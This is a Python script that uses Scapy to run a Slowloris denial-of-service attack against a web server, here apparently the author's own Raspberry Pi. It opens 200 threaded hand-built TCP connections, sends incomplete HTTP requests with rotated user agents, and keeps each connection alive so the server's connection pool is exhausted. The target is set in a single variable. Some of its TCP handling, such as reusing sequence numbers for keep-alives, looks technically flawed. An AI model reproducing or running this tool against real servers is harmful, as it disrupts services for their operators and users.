from scapy.all import *
import random
import threading
import time
import sys
import socket

# Configuration
target_host = "raspberrypi.local"  # Raspberry Pi's hostname
target_port = 80                  # Default HTTP port
num_connections = 200             # Number of connections to simulate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
]

# Resolve hostname to IP (for logging and validation)
try:
    target_ip = socket.gethostbyname(target_host)
    print(f"[*] Resolved {target_host} to {target_ip}")
except socket.gaierror:
    print(f"[-] Could not resolve hostname {target_host}. Check your network or hostname.")
    sys.exit(1)

# Function to create a partial HTTP request
def build_partial_request():
    ua = random.choice(user_agents)
    request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {ua}\r\nAccept: text/html\r\nConnection: keep-alive\r\n"
    return request

# Function to simulate a single Slowloris connection
def slowloris_connection():
    try:
        # Create a TCP socket using Scapy with hostname
        ip = IP(dst=target_host)  # Scapy will resolve the hostname
        syn = ip / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        syn_ack =  sr1(syn, timeout=5, retry=2, verbose=0)  # Increased timeout + retries

        
        if not syn_ack or syn_ack[TCP].flags != "SA":
            print("[-] Failed to establish connection")
            return
        
        # Complete the handshake
        ack = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ack, verbose=0)
        
        # Send partial HTTP request
        partial_request = build_partial_request()
        packet = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="PA", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1) / partial_request
        send(packet, verbose=0)
        print(f"[+] Connection established from port {syn[TCP].sport}, keeping alive...")
        
        # Keep the connection alive by sending small chunks periodically
        while True:
            time.sleep(10)  # Send keep-alive every 10 seconds
            keep_alive = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="PA", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1) / "\r\n"
            send(keep_alive, verbose=0)
            
    except Exception as e:
        print(f"[-] Error in connection: {e}")

# Main function to launch multiple connections
def start_slowloris():
    print(f"[*] Starting Slowloris simulation against {target_host}:{target_port}")
    print(f"[*] Launching {num_connections} connections...")
    
    threads = []
    for _ in range(num_connections):
        t = threading.Thread(target=slowloris_connection)
        t.daemon = True  # Allows program to exit with Ctrl+C
        t.start()
        threads.append(t)
        time.sleep(0.1)  # Small delay to avoid overwhelming the system
    
    # Keep the main thread running
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Stopping Slowloris simulation...")
        sys.exit(0)

if __name__ == "__main__":
    
    
    start_slowloris()